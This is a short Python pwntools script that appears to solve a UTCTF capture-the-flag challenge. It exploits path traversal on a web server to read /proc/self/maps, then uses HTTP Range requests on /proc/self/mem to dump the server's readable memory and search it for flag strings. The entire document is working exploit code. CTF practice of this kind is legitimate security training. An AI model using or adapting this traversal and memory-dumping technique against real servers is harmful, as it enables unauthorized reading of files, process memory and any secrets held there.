from pwn import *

#host = "127.0.0.1"
host = "guppy.utctf.live"
port = 7884

requests = 1
received_data = 0

io1 = remote(host, port)
io1.send("GET /../../../../../proc/self/maps HTTP/1.1\r\n\r\n")
io1.recvuntil(b"\r\n\r\n")
lines = io1.recvall().split(b"\n")
print(lines)
received_data = len(b"\n".join(lines))

mem_dump = b''
results = []
for line in lines:
    if line == b"":
        continue
    parts = line.decode().split(" ")
    addresses = parts[0]
    access = parts[1]
    if "r" not in access:
        continue
    print(line)
    [start, end] = addresses.split("-")
    io2 = remote(host, port)
    io2.send("GET /../../../../../proc/self/mem HTTP/1.1\r\nRange: bytes=" + str(int(start, 16)) + "-" + str(int(end, 16) - 1) + "\r\n\r\n")
    response = io2.recvall()
    requests += 1
    received_data += len(response)
    if b"206 Partial Content" not in response:
        print("Error on " + line.decode() + ":\n", response)
    else:
        start = None
        while True:
            flag_pos = response.find(b"utflag{", start)
            if flag_pos < 0:
                break
            flag_guess = response[flag_pos:flag_pos + 100]
            results.append("Found in " + line.decode() + ": " + repr(flag_guess[:flag_guess.index(b"}") + 1]))
            start = flag_pos + 1

for result in results:
    print(result)
print(requests, "requests made, " + str(received_data) + " bytes received")